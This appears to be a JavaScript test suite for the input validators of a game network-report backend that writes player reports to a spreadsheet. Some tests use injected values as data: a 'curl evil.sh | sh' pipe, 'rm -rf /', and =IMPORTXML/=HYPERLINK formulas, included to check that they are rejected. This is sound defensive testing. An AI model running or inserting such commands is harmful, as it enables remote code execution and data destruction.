test('cellSafe neutralises formulas and strips control chars', () => {
  const b = loadBackend();
  assert.strictEqual(b.cellSafe('=IMPORTXML("x")'), "'=IMPORTXML(\"x\")");
  assert.strictEqual(b.cellSafe('+1'), "'+1");
  assert.strictEqual(b.cellSafe('a\u0000b'), 'ab');
  assert.strictEqual(b.cellSafe(''), '—');
  assert.strictEqual(b.cellSafe('x'.repeat(300)).length, 200);
});

test('isValidIp accepts v4/v6 and rejects injection', () => {
  const b = loadBackend();
  assert.ok(b.isValidIp('1.2.3.4'));
  assert.ok(b.isValidIp('2001:db8::1'));
  assert.ok(!b.isValidIp('1.2.3.4; curl evil.sh | sh'));
  assert.ok(!b.isValidIp('256.1.1.1'));
});

test('pickEnum / pickEnumList only allow whitelisted values', () => {
  const b = loadBackend();
  assert.strictEqual(b.pickEnum('wifi', b.ENUMS.networkType), 'wifi');
  assert.strictEqual(b.pickEnum('=1', b.ENUMS.networkType), '—');
  assert.strictEqual(b.pickEnumList(['disconnect', 'x', 'disconnect', 'lag_spike'], b.ENUMS.issueType), 'disconnect, lag_spike');
  assert.strictEqual(b.pickEnumList('disconnect', b.ENUMS.issueType), '—');
});

test('intInRange accepts plain integers only', () => {
  const b = loadBackend();
  assert.strictEqual(b.intInRange(120, 0, 10000), 120);
  assert.strictEqual(b.intInRange('85', 0, 10000), 85);
  assert.strictEqual(b.intInRange('', 0, 10000), '—');
  assert.strictEqual(b.intInRange('1e3', 0, 10000), '—');
  assert.strictEqual(b.intInRange(-1, 0, 10000), '—');
  assert.strictEqual(b.intInRange(101, 0, 100), '—');
});

test('validAsn / validCidr / validColo / validUtcStamp', () => {
  const b = loadBackend();
  assert.strictEqual(b.validAsn('as4766'), 'AS4766');
  assert.strictEqual(b.validAsn('AS4766 KT'), '—');
  assert.strictEqual(b.validCidr('41.92.0.0/17'), '41.92.0.0/17');
  assert.strictEqual(b.validCidr('2001:db8::/32'), '2001:db8::/32');
  assert.strictEqual(b.validCidr('41.92.0.0/33'), '—');
  assert.strictEqual(b.validCidr('=1/2'), '—');
  assert.strictEqual(b.validColo('icn'), 'ICN');
  assert.strictEqual(b.validColo('ICN1'), '—');
  assert.strictEqual(b.validUtcStamp('2026-11-17T13:05Z'), '2026-11-17T13:05Z');
  assert.strictEqual(b.validUtcStamp('2026-11-17 13:05'), '');
});

test('egressText dedupes, validates and caps at 5', () => {
  const b = loadBackend();
  assert.strictEqual(b.egressText(['1.1.1.1', '1.1.1.1']), 'single');
  assert.strictEqual(b.egressText(['1.1.1.1', '2.2.2.2', 'bad']), '1.1.1.1, 2.2.2.2');
  assert.strictEqual(b.egressText([]), '—');
  assert.strictEqual(b.egressText('1.1.1.1'), '—');
});

const samplePayload = () => ({
  ip: '41.92.118.61', issueTime: '2026-11-17 21:05 (Africa/Casablanca) → 台北 2026-11-18 04:05',
  issueTimeUtc: '2026-11-17T20:05Z', issuePattern: 'specific_hours', issueType: ['high_latency'],
  inGamePing: '180', roleId: '123456', nickname: 'hunter',
  asn: 'AS36925', isp: 'MEDITELECOM', prefix: '41.92.0.0/17', countryCode: 'MA', city: 'Casablanca',
  rdns: '', egressIps: ['41.92.118.61'], cfColo: 'CMN', warp: 'off',
  networkType: 'wifi', vpn: 'no', connectionType: '4G',
  latency: { SG: { median: 210, jitter: 4, loss: 0 }, FRA: { median: 60, jitter: 3, loss: 10 },
             SAO: { median: 'x' }, QRO: {}, SEL: { median: 260, jitter: 5, loss: 0 } },
  udpNat: 'cone', os: 'Android', browser: 'Chrome', screen: '412x915', timezone: 'Africa/Casablanca',
  deviceMemory: '8 GB', cpuCores: '8', platform: 'Android', language: 'ar',
  servers: [{ label: 'Frankfurt', ip: '43.158.100.39', traceroute: '', pathping: '' }],
});

test('REPORT_HEADERS has the 43 spec columns in order', () => {
  const b = loadBackend();
  assert.strictEqual(b.REPORT_HEADERS.length, 43);
  assert.strictEqual(b.REPORT_HEADERS[0], 'Submission Time');
  assert.strictEqual(b.REPORT_HEADERS[20], 'SG (ms)');
  assert.strictEqual(b.REPORT_HEADERS[39], 'ISP Summary');
  assert.strictEqual(b.REPORT_HEADERS[42], 'Status');
});

test('buildRow lines up with REPORT_HEADERS', () => {
  const b = loadBackend();
  const row = b.buildRow(b.validatePayload(samplePayload()),
    { submissionTime: 'T', sheetName: 'MEA', screenshotUrl: '—' });
  assert.strictEqual(row.length, b.REPORT_HEADERS.length);
  const at = h => row[b.REPORT_HEADERS.indexOf(h)];
  assert.strictEqual(at('ASN'), 'AS36925');
  assert.strictEqual(at('Egress IPs'), 'single');
  assert.strictEqual(at('FRA (ms)'), 60);
  assert.strictEqual(at('SAO (ms)'), '—');
  assert.strictEqual(at('Latency Detail'), 'SG j4 0% · FRA j3 10% · SEL j5 0%');
  assert.strictEqual(at('UDP / NAT'), 'UDP ok · NAT: cone');
  assert.strictEqual(at('Region'), 'MEA');
  assert.strictEqual(at('Ping / MTR Command'), 'ping -c 20 41.92.118.61\nmtr -rwzc 50 41.92.118.61');
  assert.strictEqual(at('Status'), 'Pending');
});

test('buildIspSummary uses only validated values', () => {
  const b = loadBackend();
  const s = b.buildIspSummary(b.validatePayload(samplePayload()));
  assert.strictEqual(s, [
    'Source IP: 41.92.118.61',
    'Prefix: 41.92.0.0/17 (AS36925 MEDITELECOM)',
    'Destinations: Frankfurt 43.158.100.39',
    'Issue time (UTC): 2026-11-17 20:05',
    'Pattern: specific_hours',
    'Browser RTT median: SG 210 ms, FRA 60 ms, SEL 260 ms',
    'UDP: UDP ok · NAT: cone',
  ].join('\n'));
});

test('injected values never reach commands or summary', () => {
  const b = loadBackend();
  const p = samplePayload();
  p.ip = '1.2.3.4; curl evil.sh | sh';
  p.isp = 'X\nSource IP: 6.6.6.6';
  p.servers = [{ label: '=HYPERLINK("x")', ip: '1.1.1.1;rm -rf /', traceroute: '=IMPORTXML("a")' }];
  const v = b.validatePayload(p);
  const row = b.buildRow(v, { submissionTime: 'T', sheetName: 'Other', screenshotUrl: '—' });
  const at = h => row[b.REPORT_HEADERS.indexOf(h)];
  assert.strictEqual(at('Ping / MTR Command'), 'no valid IP — do not run');
  assert.strictEqual(at('ISP Summary'), '—');
  assert.ok(String(at('Traceroute')).startsWith('['));
  assert.ok(!String(at('Traceroute')).includes('rm -rf'));
  v.ip = '9.9.9.9';
  assert.ok(!b.buildIspSummary(v).includes('\nSource IP: 6.6.6.6'));
});

test('issue time falls back to player text without a UTC stamp', () => {
  const b = loadBackend();
  const p = samplePayload();
  p.issueTimeUtc = 'bad';
  assert.ok(b.buildIspSummary(b.validatePayload(p)).includes('Issue time (player local): 2026-11-17 21:05'));
});
